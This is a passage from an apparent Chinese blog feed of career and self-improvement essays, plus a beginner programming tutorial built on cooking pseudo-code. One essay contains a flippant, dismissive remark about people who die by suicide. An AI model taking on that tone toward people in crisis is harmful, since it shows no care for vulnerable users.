title="小结"></a>小结</h3><p>想获得好的社交，可以尝试不断地置换身边交流的人，让负面的声音、消极的身影和低质量的信息从自己的视线里减少，慢慢的，你的社交质量就上来了。</p><p><strong>遵从自己的内心，真诚、友善、和谐地社交，也会赢得更多的高质量的社交。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么无法突破到下一个层级？</title>
      <link href="/blog/2020/06/18/why-promotion-is-a-difficult-thing/"/>
      <url>/blog/2020/06/18/why-promotion-is-a-difficult-thing/</url>
      
        <content type="html"><![CDATA[<p>在阿里工作了五六年，见过很多优秀的工程师和合作伙伴，同时也看到了不少同学因为无法突破到下一个层级，而选择了放弃，或者泄气。</p><p>很多事情看起来是特别清晰的，一步、两步、三步，把这几个步骤走完了，事情也就结束了；与其说清晰，还不如说简单吧，特别是业务性的工作，真的是一眼可以望到尽头。我们必须承认，工作很多时候是需要用点蛮力的，你拥有再多的技能，在受限的环境下，也难以施展开来。**所谓的脏活、苦活、累活，你不想去做，但是也得去做，因为那是成就你的一部分内容，可能你的运气好一点，这种活有人替你扛下来了。</p><p>如何在看似恶劣的环境中存活下来，然后逐步拔高呢？下面我列举了几个常规性问题和操作，以促进思考：</p><p><strong>1、思考不足</strong></p><p>在工作中的执行属性过强，对问题缺乏深度的思考，简单点说，就是问「为什么」问的太少了，在问题过来的时候，我们必须搞清楚为什么背后的为什么，打破砂锅问到底。写作是一个很好的弥补措施，thinking in writing，写的过程就会促使自己去整理和思考。</p><p><strong>2、视野不够</strong></p><p>只能看到自己的问题，只能看到当下的问题，缺乏横向和纵向的比较。遇到问题，多看看别人是怎么处理的，想一想自己做的东西别人可以如何利用，既要走出去又要领进来。</p><p><strong>3、底蕴不强</strong></p><p>解决的大多数问题都是简单问题，挥一挥手打个补丁就结束了，很少去思考共性问题，缺乏服务意识和产品化能力。这一点并不难突破，在多思考和总结的基础上，多一些耐心，咬定青山不放松，在难啃的骨头上多啃几下，很多事情就可以拨开云雾见青天了。</p><hr><p><strong>上限和下限</strong></p><p>最近看到一个不错的观点，说<strong>努力决定你的下限，而选择决定了你的上限</strong>，我觉得说的有一定的道理。</p><p>作为一个技术人，扎实的基础和丰富的经验是行业立命之本，在这一块是绝对虚不得的，必须花费大把的努力，让自己的根基更加夯实。</p><p>而选择，伴随了太多的不确定性，运气显得有点重要，但是我想说的是，<strong>尽可能地提升自己，让自己成为别人的首选项，才能给自己争取更多的议价能力</strong>，坑有的时候就那么几个，争取让自己成为萝卜。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>心理契约的打破过程</title>
      <link href="/blog/2020/06/17/break-contract/"/>
      <url>/blog/2020/06/17/break-contract/</url>
      
        <content type="html"><![CDATA[<p>契约说的简单一点，就是双方对责任和义务的一个纸面陈述，你付出什么内容，帮助对方达成某种期望的同时，也对你有所回报。而这里要说的心理契约，它是不会落到纸面上的，比如口头的一个承诺，或者对某件事情双方都会满意的一个心理预期，你需要为这个承诺和心理预期付出努力。</p><p>心理契约经常出现在工作之中，举个例子，你的能力比较突出，超过了周边人的平均水平，那么老板对你的心理预期就会略高一些，如果你最后拿到的结果跟其他人差不多，你就没有达成这种心理契约，事实上，你和老板最终都能比较明确地感知出来。</p><p>在组织行为学里，对心理契约有一个比较标准的定义：<strong>任何时刻都存在于个体与组织之间的一系列没有明文规定的期望。</strong>那么通常我们是如何打破心理契约的呢？</p><p><strong>1、理解不一致</strong></p><p>你以为自己很厉害，但是老板觉得你不行；老板以为你很厉害，但是你自己觉得不行。或者老板觉得你想拿到 A+，但是你目标只是 B+。</p><p>一旦出现理解不一致，那么最后的结果，一定是让人不满意的。实际上，这是对目标定义的问题，我们需要把心理契约一部分显式落地在纸面上，让双方都清楚彼此的底线和预期。</p><p><strong>2、未及时响应变化</strong></p><p>随着时间的变化，每个人的中、短期目标也在发生调整，对一件事情的预期自然也是在变化的，如果双方没有对焦过程，很容易就会出现理解偏差。</p><p>最常见的一种情况是，当你在工作中有明显成长的时候，组织对你的要求也会趋向于提高到你几乎不能胜任的状态，说的简单一点，组织对你的要求提高了，如果你仍然保持当初对自己的要求，那么很快，你就会陷入无力兑现承诺的状态。</p><p>其实这个时候，需要学会抛出问题，也抛出自己的真实想法。双方都进行心理契约的微调，或者巩固。</p><p><strong>3、契约对象改变</strong></p><p>当你和另一个组织有了心理契约以后，大概率你会主动违背当前的契约，这种情况一般是难以挽救的，契约人会逐步弱化这种契约关系，慢慢的，放弃。</p><hr><p>很多时候，心理契约比落在纸面上的合同要有效的多，因为它包含了一种隐性的默契，大家没有敞开了说透，但是心里都跟明镜似的。与人建立这种契约关系，并且不断的调整契约内容，是可以很好的帮助人和组织之间相处得更加融洽的。</p><p><strong>与自己的心理契约</strong></p><p>另外，我想说的一点是，跟自己的心理契约。</p><p>这是一种为了达成某种期望，在心底与自己建立的隐性条约，需要非常强大的自律精神才能兑现。因为这种隐藏在心里，只有自己知道的内容，是很容易因为主客观环境的改变而立刻被改变的。除了自律以外，内心还需要有执念，或者说信念吧。</p><p><strong>能够跟自己建立心理契约的人，都是内心强大的人。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>用未来的视角来看今天</title>
      <link href="/blog/2020/06/16/look-from-future/"/>
      <url>/blog/2020/06/16/look-from-future/</url>
      
        <content type="html"><![CDATA[<p>无数次听到有人说“迷茫”了，我自己也是如此，太多次感觉到不知所措，似乎前路总是罩着一层面纱，让人捉摸不透。</p><p>渐渐地，我想明白了，目光还是瞄得太近。<strong>想想五年后的自己会是什么样，再看看现在自己做的事情，或许会有更多的想法。</strong>当我们用未来的视角来看待今天的自己时，很多问题都会暴露出来。</p><p><strong>1、 今天正在忍受很多委屈？</strong></p><p>想一想过去五年自己的变化，再想一想未来五年你可能的变化，今天的这点委屈算什么？不过是一粒尘埃飘进了眼里，揉一揉也就干净了。那些动不动就跳楼自杀的人，我只想问一句，你能不能等到明天再跳，后天行不行呢？<strong>等一等，事情就会有转机。</strong></p><p><strong>2、今天的自己在哪里？</strong></p><p>想一想未来的自己想去到哪里，能走到哪里，再看看自己站在什么位置，大抵就明白了，现在的自己还缺少太多的属性，还无法匹配所畅想的未来的那个位置。这个时候也可以多问问自己，现在的路走偏了么？我是不是掉到坑里了，这个坑是需要被填平还是尽早弃坑？<strong>对待自己的成长，我们需要有一点功利主义。</strong></p><p><strong>3、未来的路该怎么走？</strong></p><p>每天都需要面临一大堆的选择，午餐到底是吃麻辣火锅还是重庆小面，手上的 offer 要不要接，出门应该穿裙子还是短裤，到底是去海南度假还是爬武当山，等等，大大小小的选择，选择一个也就等于放弃了另外一个，在诸多的选择中，我们有了自己的选择公式，我们懂得了断舍离，懂得了把复杂的人生搞的简单，懂得了**未来的路其实就是不断的做减法，让杂音更少，让自己的精力更加聚焦。</p><hr><p>说几句题外话。</p><p>有人问，不同层级的人的区别是什么，我觉得高年级的同学，总是能比低年级的同学看得高、看得远、看得深。</p><p>为什么会出现这样的差异，我觉得有两点，一是实战经验，二是不断学习。优秀的人往往会有更多的机会获得更优质的资源，进步自然也会更快，而进步快则会变得更加优秀，知道更多别人不知道的道理和心得。</p><p>大家最初都站在同一个起跑线上，有的人刚开始很卖力走到了前头，得到了更好的资源，于是就有了更多一帆风顺、平步青云的可能性。</p><p><strong>其实，任何时候开始努力都不算晚，你总有机会在某个方向走在大多数人前列。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>💰 工作经常被无关紧要的事情打断，怎么办？</title>
      <link href="/blog/2020/06/15/gw5nxg/"/>
      <url>/blog/2020/06/15/gw5nxg/</url>
      
        <content type="html"><![CDATA[<p>工作的节奏特别容易被一些「无关紧要」的事情打断，我举几个例子：</p><ol><li>用户反馈某个功能不可能，排查发现是用户的姿势不对；</li><li>合作伙伴说有个细节之前沟通有问题，再次沟通后发现只是一个很小的细节，他完全可以自己做主；</li><li>修改一个模块，上线时明明只改了 A，系统却提示 B 处有存量问题，必须先修复；</li><li>来了一封招聘相关的邮件，加了候选人沟通一下；</li><li>老板说组织一个会议，讨论下近期的一个技术问题的解决方案；</li></ol><p>诸如此类，还有很多很多，能够打断工作的事情层出不穷，再加上你不够自律，上班的时间玩玩手机，刷刷朋友圈，看看新闻，学习下新知识等等，那一天中能够投入到核心项目的可用时间就特别特别少了。最后，把自己的年度规划拿出来晒一晒，发现几无进展。</p><p><a name="cP7CY"></a></p><h2 id="如何破局？"><a href="#如何破局？" class="headerlink" title="如何破局？"></a>如何破局？</h2><p>想在工作时间内（也就是不加班或者少加班）做更多计划之内的事情，那就有必要帮助自己挤出几个大块的时间出来。因为工作一旦被打断，信息的上下文切换成本是特别高的，很多人需要 5-10min 时间才能回到上一个被打断的上下文中，试想一下，每隔半小时被人（或者从手机和电脑里冒出的消息）打断一次，你在一个小时的产出会高么？更何况不够自律的你可能十分钟就会被各类信息打断一次。</p><p>看着时间不断的流逝，内心的焦虑感会经常涌现，怎么办？<br />上面提出的问题，有来自客户的，有来自同事的，有来自老板的，有来自自己的，还有来自合作伙伴的，当然如果你是一个团队管理者，还可能是来自下属的。</p><p>如何破局呢？我觉得有以下几个思路突破：</p><p><a name="Ej48D"></a></p><h3 id="1、信息分级"><a href="#1、信息分级" class="headerlink" title="1、信息分级"></a>1、信息分级</h3><p>首先请你删除手机和电脑里与工作无关的非必要软件，尤其是娱乐休闲游戏新闻类的应用，如果你实在不舍得删除，可以将这些应用的消息推送功能关闭。</p><p>在邮件中增加几个文件夹，通过过滤器自动分组，让重要的邮件进入 VIP 文件夹，次要的邮件到 Delay 文件夹，没有信息量的文件放到 Pass 文件夹，甚至直接标记为已读。</p><p>工作聊天软件将关键的人和项目组置顶，或者通过文件夹分组。以此类推，其他需要分组分级的信息。</p><p><a name="jbNJq"></a></p><h3 id="2、大块时间"><a href="#2、大块时间" class="headerlink" title="2、大块时间"></a>2、大块时间</h3><p>工作的时候除非有人钉你再及时去看，否则放到固定的时间定时处理，不要担心错过极其重要的信息，真的有啥问题，有人会电话过来。关键系统异常可以通过监控发短信或者电话通知，防止错过。</p><p>分清楚工作上事情的重要性和紧急性，非特别重要或者特别紧急的事情搁置到统一的时间处理。会议统一安排在一天的上午或者下午，问清楚会议的目标，相关度低的会议能推脱的会议尽量推脱，感觉是发散性的会议，请要求会议发起人带上具体议题和基本方案，否则不要参加。</p><p><a name="rFCyG"></a></p><h3 id="3、每日三件事"><a href="#3、每日三件事" class="headerlink" title="3、每日三件事"></a>3、每日三件事</h3><p>每天早上定好今天需要完成的三件事，不能太大也不能太小，大事分成小任务，小事合并成大任务，保证自己大块的时间是有内容可消耗的，否则大块的时间也会被你的各种分心自动化解成小块而变成低价值时间。</p><p><a name="fvCrc"></a></p><h3 id="4、记录时间"><a href="#4、记录时间" class="headerlink" title="4、记录时间"></a>4、记录时间</h3><p>想知道自己为什么忙，就把自己每个小时做的事情都记录到日历上，事无巨细，记录一个星期，然后回过头来看看，自己大块时间的安排上有何不妥，也仔细分析下，自己是不是真的忙，是假象还是资源不够。</p><p><a name="LbOvG"></a></p><h3 id="5、时间去重"><a href="#5、时间去重" class="headerlink" title="5、时间去重"></a>5、时间去重</h3><p>从记录的结果中查看，是否一周内有重复在做某件事情，比如一直发生案例 1 的问题，是否是系统设计存在缺陷，是否是文档存在遗漏，想想解决问题的根本方法，可能解决这个问题比回答用户的疑问要复杂得多，但是长期来看这是节约时间的重要法门。</p><p><a name="zd50W"></a></p><h3 id="6、延长时间价值"><a href="#6、延长时间价值" class="headerlink" title="6、延长时间价值"></a>6、延长时间价值</h3><p>时间是有限的，一天只有 24 小时，但是单位时间内创造的价值是可以在未来持续生效的，想要增加这类价值，需要从工程和架构的角度考虑问题，从这个角度看到的问题会更大，成本也更高，但解决问题的成本增加的同时，收益也会从短期变成长期。</p><p>以上，希望可以引发你的思考。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>行动本身并不是最重要的</title>
      <link href="/blog/2020/06/12/fw90x1/"/>
      <url>/blog/2020/06/12/fw90x1/</url>
      
        <content type="html"><![CDATA[<p>在学习的时候，我们经常会陷入一个误区，十分急切的想知道该如何做（how），但是却忘记了去思考 what 和 why。</p><ul><li>理解是什么，可以让我们缩小行动的区间，把精力放在核心的事情上</li><li>理解为什么，可以让我们思考行动背后的具体指导原则是什么，在行动的时候不偏离预设的轨道</li></ul><p>每个行动的背后一定可以找到底层的方法论做支撑，从行动点向下思考追溯到对应的底层原则和方法，然后结合自己的目标，可以派生出更多的有效行动方案，所以说，行动本身并不是最重要的。</p><h2 id="减缓行动-先落在纸面上"><a href="#减缓行动-先落在纸面上" class="headerlink" title="减缓行动 - 先落在纸面上"></a>减缓行动 - 先落在纸面上</h2><p>之前我在淘系工程团队的时候，组里有个习惯，所有超过一周开发工作量的内容都需要立项，立项之后，所有项目的执行都必须有具体的方案，落在文档上，才能进入开发阶段。</p><p>刚开始，其实大家挺不能接受，因为之前没有这种习惯，想到了啥，有了大概的思路直接去做，做到一半发现细节上存在问题就讨论一波，然后接着做，看起来效率是挺高的，但是呢？也存在一些风险。</p><ul><li>很多小的问题和风险没有提前感知，导致卡进度甚至直接阻塞</li><li>执行的过程中发现可以顺便把别的一些需求也做掉，结果经常别的需求喧宾夺主</li><li>返工情况较多，很多内容考虑不周全，流程设计体验不佳</li><li>……</li></ul><p>把东西落在纸面上，有流程图，有分析过程，有细节思考，有风险管理，很多事情进展起来也就稳了很多了。</p><p>看起来是慢了，实际上是快了，而且有了沉淀。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么事情总是坚持不下来？</title>
      <link href="/blog/2020/06/11/uqpgqd/"/>
      <url>/blog/2020/06/11/uqpgqd/</url>
      
        <content type="html"><![CDATA[<p>执行力是什么？<strong>百科上这么说的，所谓执行力，指的是贯彻战略意图，完成预定目标的实际操作能力。</strong>我们拆分下：</p><ul><li>首先我们需要有一个明确的目标，知道我们实际行动是做什么事情（Plan）</li><li>执行力是一种能力，是一种操作能力，也就是说需要我们付出实际行动（Do）</li><li>然后我们要理解目标，防止在实际操作的过程中误入歧途（Check）</li><li>如果误入歧途怎么办？及时作出调整，或者修正初始目标（Adjust）</li></ul><h2 id="为何我的执行力不强？"><a href="#为何我的执行力不强？" class="headerlink" title="为何我的执行力不强？"></a>为何我的执行力不强？</h2><p><strong>简单来说，执行力就是做事的能力</strong>，上面的拆分其实就是 PDCA 工作法的展示，这是一个循环的过程，调整目标之后，进入下一个 <strong>Adjust-Plan-Do-Check</strong> 的过程。那为什么你的执行力不强呢？其实道理也很简单，从上四个步骤中找原因：</p><ol><li><strong>计划 Plan</strong></li></ol><ul><li>目标含糊，不知道自己要做什么</li><li>没有工具和手段来衡量目标</li><li>目标太大，几乎无法达到</li><li>目标太多，没有重点，目标之间没有关联</li><li>没有设定期限，无时限地行动下去</li></ul><ol start="2"><li><strong>执行 Do</strong></li></ol><ul><li>能力不足，无法达到</li><li>条件受限，无法达到</li></ul><ol start="3"><li><strong>检查 Check</strong></li></ol><ul><li>检查不及时，偏离轨道太久，可能已经没有继续的欲望了</li><li>检查项与考核内容不一致</li><li>越查事情越多，做着做着，脱离了目标</li></ul><ol start="4"><li><strong>调整 Adjust</strong></li></ol><ul><li>没有这个步骤</li></ul><p>Plan 步骤中提到的 5 点其实就是 S.M.A.R.T 原则的基本要求，这 5 点都是反例。如果你定好了一个恰当的目标，在行动过程中不断地对焦，那么事情就不会过于脱轨。</p><h2 id="目标设置的合理性"><a href="#目标设置的合理性" class="headerlink" title="目标设置的合理性"></a>目标设置的合理性</h2><p>如何判断目标是否恰当呢，我的经验是：<strong>「有趣且有挑战」</strong>，比如：</p><ul><li>我要减肥并不是很好的目标，我想在沙滩上秀腹肌给一群妹纸看就好多了，你可以在每次健身和节食的时候都想象下那个画面</li><li>我要提升英语并不是很好的目标，我想一个人去国外旅游，欣赏国外的美景，尝遍国外的美食，这个画面就比较有意思了</li><li>我今年要看完二十本书并不是一个很好的目标，我想提升自己的结构化思考力，在跟人聊天、演讲、汇报的时候更顺利，这就有点动力了</li></ul><p>所以说，很多时候并不是你执行力不够，而是你的目标定的没有吸引力，或者目标定的太大或太小，如果你的目标刚刚好，你仍然不能坚持下去，那只有两个原因：</p><ul><li>你这个人啊，太没有毅力了</li><li>你这个目标达不达成，可能对你来说，无所谓（还是目标的吸引力不够）</li></ul><p>以上，希望对你有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“要事第一”不是把紧急且重要的事情摆在前头</title>
      <link href="/blog/2020/06/10/sifky9/"/>
      <url>/blog/2020/06/10/sifky9/</url>
      
        <content type="html"><![CDATA[<p>一直以来我理解的要事第一是对事情紧急度和重要性做一个四象限分布排序工作，最近看到一个观点让我有了新的认知。</p><p>事情是否重要，是否紧急，是很好判断的，大多数人都能够做好这件事情，但是即便是做好了，其效果也不见得十分明显，大抵只是没有以前那么繁忙了，处理事情变得从容一些了。</p><p>缺了点什么呢？在于，<strong>排序出来的内容不足以支撑我们突破，本质上，我们只是更好地按部就班罢了。</strong></p><p><strong>什么是真正重要的事情？那一定是可以拿到成果、做出价值的</strong>，而成果分为大成果和小成果，价值分为大价值和小价值，按照思维惯性对事情进行紧急重要分类，大多只能获得小成果和小价值，因为那只是对做事节奏的数学层面排序，很难出现本质上的变化。</p><p><strong>其实，要事第一背后需要的是勇气</strong>，怎么理解？</p><p>放弃以往的成果，站在未来重新考虑问题，能做到么？能做到什么程度？我们的思考往往都是基于过去的惯性思维或者发散思维，<strong>如果过去的方向本来就不是最佳（往往如此），那后续我们所思考的一切都只是在不够正确的道路上往前再踏进了一小步。</strong></p><p>去定义一个很长远很大的目标，做得到么？人终究逃不过趋利避害的生物本能，在进行决策的时候，我们经常会向困难低头，选择保险、安全的方案，事情太大不愿做，事情太难不想做。</p><p>为什么勇气会成为要事第一的基础？其实我们所做的每一个决定都会影响后续自己的行动，把最重要的事情拎出来的同时，事实上也把自己的价值判断准则秀出来了，如果我们不能突破过去、突破困难，思考的格局不够远大，那自然是不太可能拿到大的结果和大的价值的。</p><p><strong>要事第一，就是给自己信心和勇气，把最有挑战，最有价值的事情琢磨出来，排到最前面，然后挤出大把的时间，去做好这件事情。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不是干货我懒得看</title>
      <link href="/blog/2020/06/09/fn8m9k/"/>
      <url>/blog/2020/06/09/fn8m9k/</url>
      
        <content type="html"><![CDATA[<p>很多人在过滤信息、寻找知识的时候，都偏向于挑选「干货」，而对于普适性的内容便觉得没什么含量。<strong>其实无论是“干货”还是“湿货”，都有它们的局限性。</strong></p><p>一个放之四海而皆准的道理，它描述的一定是一般性问题，抽象程度高，也易于理解，但往往会缺乏准确性，因为它把具体场景排除在外了，我们在分析问题的时候更多地还是应该站在当时的情景中去寻找客观原因和主观原因。</p><p>而干货，其专业性一般都很强，它是对特定问题在特定情况下的经验和方法的总结，可能它不再是一个观点，而是一个公理，甚至定律，大部分的干货都有失一般性，把某个结论换到另一个领域可能就没法聊了，而且理解成本也很高。</p><p><strong>一般性、简单性和准确性，三者是不可兼得的。</strong>我们在论述时，可以先从一般性出发，通过最简单好记的方式在受众心里埋下一颗种子，比如“失败是成功之母”，然后从专业性的角度，站在具体的背景下分析问题。<strong>同样，在汲取信息的时候，也应该兼顾干货和湿货，前者更多的偏知识和理论，而后者更多的是方法论和原则，两者都很重要。</strong></p><blockquote><p>本文发表于 2019&#x2F;6&#x2F;22</p></blockquote><h2 id="精选读者评论"><a href="#精选读者评论" class="headerlink" title="精选读者评论"></a>精选读者评论</h2><blockquote><p>@Bernie维尼：“从我个人感受来说一开始看些高度抽象的金句，只停留在好有道理的程度，没有办法指导自己的行为。当经历过具体场景之后再回头看这句话时候可能就可以成人行动原则，因为实践结合了理论，没有确实任何信息。”</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简历需要让人看出你做成了什么，而不是做过什么</title>
      <link href="/blog/2020/06/08/sd4q5b/"/>
      <url>/blog/2020/06/08/sd4q5b/</url>
      
        <content type="html"><![CDATA[<p>曾经有过对如何写简历的一番讨论，交流出来一个观点，简历重在表达能够<strong>做成</strong>什么，而不是<strong>做过</strong>什么。</p><blockquote><p>有同学问道：通过一些项目经历可以很容易来表达「做过」什么，但是「做成了」什么该如何体现呢？「做成了」的指标和判断标准不太一样，这又会不会造成理解上的偏差呀。 未来「可能做成」什么我想会不会更难体现出来了。</p></blockquote><p>简历这个东西，只是一个敲门砖，我们的目的是让面试官看完后产生好感，然后给我们一个面试的机会，简历不需要表达全部的自己，面试官也一定是从后续的面试过程中获取大量的情报来深入了解你的。因此，简历写到什么程度，我们的目标很明确。</p><p>如何从简历中让人看出你「做成了」什么，以及你未来「可能做成」什么，以下几点可以参考：</p><ul><li><strong>表达一件有挑战的完整的事情</strong>，比如实现了一个平台的架构推导和落地，再如使用三个月时间经历四轮优化将系统的整体性能提升了 1.5 倍等等；而不是我写了某个网站的前端，沉淀了五个通用组件等等；</li><li><strong>展示你跨专业的特性</strong>，比如作为前端工程师，我在运维工作上做了比较突出的贡献；在图形图像方面有深入研究和良好产出；曾并发管理 5 个中型项目并保证准时交付等等；</li><li><strong>从业务价值的角度去发现问题和分析问题</strong>，比如通过融合两个相似系统后，降低了运营的成本，提高了数据从线下到线上展示的效率等；而不是简单地说，实现了数据层的合并，统一了前台交互等这种纯技术的表达；</li></ul><p>说到底，还是需要让面试官看到你这几方面的能力：</p><ol><li>技术综合能力&#x2F;学习能力（硬实力）</li><li>业务洞察力（理解力）</li><li>拿结果的能力（执行力）</li></ol><p>以上，希望对你有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇写给从未编程过的人的入门教程</title>
      <link href="/blog/2020/06/05/programming-course-for-newbee/"/>
      <url>/blog/2020/06/05/programming-course-for-newbee/</url>
      
        <content type="html"><![CDATA[<p>昨天我分享了一篇<a href="https://www.yuque.com/barretlee/yuque/aabh67">如何使用 PlantUML 这门简单的语言来绘制复杂</a>的活动图、流程图和组件图等，有的同学看到了以后，询问我，“外行需要多长时间才能学会这玩意儿呀？”，这个问题不知道该如何回答，因为我并不认同“外行”这个词。我始终认为，<strong>在编程这件事情上，每个人都是内行，每个人也都是外行</strong>。事实上，从不了解 PlantUML 到能够参考文档绘制出复杂的流程图，我也就学了一个上午，边学习、边实践、边分享，于是就会了。</p><p>学会编程没有你想象中的那么复杂。</p><h3 id="编程是什么？"><a href="#编程是什么？" class="headerlink" title="编程是什么？"></a>编程是什么？</h3><p>编程，说的简单一点，就是通过一系列逻辑将你想做的事情或者想描述的物体表达清楚，然后让它展现出来，或者运动起来。说的专业一点：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">编程 = 算法 + 数据结构</span><br></pre></td></tr></table></figure><p><strong>什么是算法？就是解决问题的办法，或者说通过几个步骤来解决一个问题的过程描述</strong>；那么什么是数据结构呢？咱们在解决问题的时候经常需要去放置一些物件，比如把书放到书架上，那么书架就是一种数据结构，把书放到柜子里，柜子就是一种数据结构，书架和柜子就是数据的不同呈现&#x2F;储存方式。</p><p>其实，每个人对编程都不陌生，你进过厨房吧，17:00 回到家，怎么让家人在 18:30 之前吃上饭？这里头的算法就多了去了，你可以先煮上饭然后去买菜，也可以买完菜再回来煮饭，那么哪种方式更好呢？下面我们用程序语言来分析这道题：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">编程问题： <span class="number">17</span>:<span class="number">00</span> 回到家，怎么让家人在 <span class="number">18</span>:<span class="number">30</span> 之前吃上饭？</span><br><span class="line">算法一：先煮上饭然后去买菜</span><br><span class="line">算法二：买完菜再回来煮饭</span><br></pre></td></tr></table></figure><p>这里的做饭是一个程序实体，它包含了煮饭、买菜、切菜、做菜，这个程序实体的表达方式是：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">做饭 = &#123;</span><br><span class="line">  煮饭() &#123;&#125;,</span><br><span class="line">  买菜() &#123;&#125;,</span><br><span class="line">  切菜() &#123;&#125;,</span><br><span class="line">  做菜() &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把中文换成英文不就是你平时看到的程序代码么？所以说呀，编程对你其实并不陌生，它也没你想象中的那么复杂。</p><h3 id="编程的核心是什么？"><a href="#编程的核心是什么？" class="headerlink" title="编程的核心是什么？"></a>编程的核心是什么？</h3><p>为什么人跟人之间编写出来的代码有这么大的差异，或者说，为什么存在小白和专家的区别？编程确实不复杂，复杂的原因是很多人不能把问题思考周全，我举个例子你就知道了：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">做饭 = &#123;</span><br><span class="line">  开始() &#123;</span><br><span class="line">    煮饭(); 买菜(); 切菜(); 做菜();</span><br><span class="line">  &#125;,</span><br><span class="line">  煮饭() &#123;&#125;,</span><br><span class="line">  买菜() &#123;&#125;,</span><br><span class="line">  切菜() &#123;&#125;,</span><br><span class="line">  做菜() &#123;</span><br><span class="line">    <span class="keyword">if</span> (家里没有油了) &#123; 买油(); 炒菜(); &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; 炒菜(); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">做饭-&gt;开始();</span><br></pre></td></tr></table></figure><p>我们定义了一个程序实体叫做「做饭」，包含了几个步骤，开始、煮饭、买菜、切菜和做菜，在编程语言里头，我们把「做饭」称之为对象，这几个步骤称之为方法，「做饭」这个对象拥有 5 个方法，我们可以一个个地调用它。首先我们调用了「开始」方法，在这个方法里，又依次调用了「煮饭」、「买菜」、「切菜」和「做菜」。</p><p>在「做菜」方法里，我们看到了一个细节，那就是“家里没油了”，咋整，这个人是这么考虑的：先去「买油」，然后回来「炒菜」。很显然，这人不靠谱，你看，菜都要下锅了，才想起没有油。但是下面这个人就不一样了：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">做饭 = &#123;</span><br><span class="line">  开始() &#123;</span><br><span class="line">    煮饭(); </span><br><span class="line">    检查结果 = 检查();</span><br><span class="line">    买菜(检查结果); 切菜(); 做菜();</span><br><span class="line">  &#125;,</span><br><span class="line">  检查() &#123;</span><br><span class="line">    <span class="keyword">if</span> (家里没有油了) &#123; 买菜的时候要买油  &#125; </span><br><span class="line">    <span class="keyword">if</span> (家里没有辣椒了) &#123; 买菜的时候要买辣椒  &#125; </span><br><span class="line">  &#125;,</span><br><span class="line">  煮饭() &#123;&#125;,</span><br><span class="line">  买菜() &#123;&#125;,</span><br><span class="line">  切菜() &#123;&#125;,</span><br><span class="line">  做菜() &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">做饭-&gt;开始();</span><br></pre></td></tr></table></figure><p>他的程序里多了个步骤叫做「检查」，在出门买菜之前，先在家里扫一眼，缺了什么，用小本本记下来，然后「买菜」的时候，带上这个小本本，这样「买菜」就不会有遗漏了。</p><p><strong>你看，这就是我们所谓的小白和专家，他们的区别就是后者能够把事情想得更加周全，在解决问题的时候，不遗留任何细节，并且呢，能够让事情可以更流畅、更快、更好地得到解决，消耗的资源最少，解决的问题最多。</strong></p><h3 id="编程的复杂性"><a href="#编程的复杂性" class="headerlink" title="编程的复杂性"></a>编程的复杂性</h3><p>不要以为我上面写的东西不是代码，稍微调整下细节，这串代码是可以在电脑上真实跑起来的，是不是特别简单啊？你还敢说自己不懂编程么？还会惧怕编程么？</p><p>但是也不要把编程想的太简单了，上面的程序表达的只是一个十分粗略的做饭过程，或者说一个做饭的思路，真正要把做饭的程序实现出来，还要考虑很多的问题，比如如何在程序中表达我要做辣椒炒肉、红烧狮子头、剁椒鱼头等等好几个菜呢？这里就涉及到“抽象”的概念，我们需要把很多相似的步骤都抽象成一种行为，然后不断重复这种行为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">做饭 = &#123;</span><br><span class="line">  开始(菜单) &#123;</span><br><span class="line">    煮饭();</span><br><span class="line">    买菜(菜单);</span><br><span class="line">    菜单-&gt;逐一(做菜);</span><br><span class="line">  &#125;,</span><br><span class="line">  买菜() &#123;&#125;,</span><br><span class="line">  煮饭() &#123;&#125;,</span><br><span class="line">  做菜(菜品) &#123;</span><br><span class="line">     洗菜(菜品);</span><br><span class="line">     切菜(菜品);</span><br><span class="line">     炒菜(菜品);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">菜单 = 辣椒炒肉、红烧狮子头、剁椒鱼头;</span><br><span 